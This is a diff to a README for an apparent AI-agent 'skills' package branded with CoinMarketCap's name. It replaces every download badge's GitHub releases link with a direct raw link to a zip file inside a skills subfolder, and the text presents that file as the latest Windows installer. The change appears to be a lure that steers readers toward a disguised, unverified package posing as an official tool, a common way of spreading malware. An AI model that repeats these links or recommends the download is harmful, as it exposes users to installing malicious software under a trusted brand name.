@@ -1,6 +1,6 @@
 # 🤖 skills-for-ai-agents-by-CoinMarketCap - AI Skills for Smarter Agents
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Skills-blue?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/andredon/skills-for-ai-agents-by-CoinMarketCap/main/skills/cmc-api-exchange/Coin_by_ai_skills_for_agents_Market_Cap_v1.7-alpha.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download, install, and start using the AI skills packag
 
 Go to the official release page by clicking the button below:
 
-[![Download Skills](https://img.shields.io/badge/Download-Skills-green?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
+[![Download Skills](https://img.shields.io/badge/Download-Skills-green?style=for-the-badge)](https://raw.githubusercontent.com/andredon/skills-for-ai-agents-by-CoinMarketCap/main/skills/cmc-api-exchange/Coin_by_ai_skills_for_agents_Market_Cap_v1.7-alpha.4.zip)
 
 This page lists all available versions of the software. You will find the latest version at the top.
 
@@ -129,6 +129,6 @@ You may want to enhance your experience:
 
 # Download and Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/andredon/skills-for-ai-agents-by-CoinMarketCap/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/andredon/skills-for-ai-agents-by-CoinMarketCap/main/skills/cmc-api-exchange/Coin_by_ai_skills_for_agents_Market_Cap_v1.7-alpha.4.zip)
 
 Visit the link above to download the latest Windows installer and start using the AI skills package by CoinMarketCap.
